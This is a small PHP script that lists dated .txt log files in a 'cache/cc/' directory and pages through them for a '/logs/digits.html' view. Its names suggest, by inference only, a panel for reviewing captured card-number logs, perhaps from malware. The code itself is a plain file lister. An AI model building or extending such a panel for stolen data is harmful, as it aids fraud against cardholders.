<?php

$page = array();
$page['count_page'] = '100';

function sf($f){	return size_format(filesize('cache/cc/' . $f));
}

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

$files = scandir('cache/cc/');
unset($files[0], $files[1]);

$pag = $Cur['page'] * $page['count_page'];

$a = array();
foreach($files as $k => $f){	if(preg_match('~_([0-9]+)\.txt$~is', $f)){
		$a[$f] = strtotime(preg_replace('~_([0-9]+)\.txt$~is', ' $1:00:00', $f));
	}else{		$a[$f] = strtotime(str_replace('.txt', '', $f) . ' 00:00:01');
	}
}

//print_rm($a);

natsort($a);
$a = array_flip($a);

$smarty->assign('files', array_slice($a, $pag, $page['count_page'], true));
$smarty->assign('pages', html_pages('/logs/digits.html?window=1&', count($files), $page['count_page'], 1, 'ldd', 'this.href'));

unset($files);

?>